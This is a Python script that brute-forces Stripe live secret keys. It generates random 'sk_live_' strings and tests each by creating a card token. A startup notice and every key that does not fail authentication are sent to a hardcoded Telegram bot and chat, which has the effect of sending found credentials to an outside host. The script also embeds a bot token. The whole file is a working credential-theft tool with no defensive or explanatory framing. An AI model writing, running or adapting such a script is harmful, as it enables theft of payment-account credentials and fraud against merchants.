import stripe
import random, string
from requests import get
import concurrent.futures

def notif():
	URL = "http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text=HeheMantap"
	get(URL)
def hasil(key):
	URL = "http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text={}".format(key)
	get(URL)

def che(key):
 stripe.api_key = key
 stripe.Token.create(
      card={
        "number": "4040404040404044",
        "exp_month": 10,
        "exp_year": 2025,
        "cvc": "343",
      },
    )
notif()
while True:
	key1 = "sk_live_{}".format(''.join(random.choices(string.ascii_letters+string.digits,k=int("{}".format(random.choice(["24","34"]))))))
	key2 = "sk_live_51G{}".format(''.join(random.choices(string.ascii_letters+string.digits,k=96)))
	key = random.choice([key1,key2])
	#print(key)
	try:
		che(key)
	except (stripe.error.AuthenticationError,stripe.error.InvalidRequestError):
		print("Dead: {}".format(key))
	except:
		print("Oke: {}".format(key))
		hasil(key)
     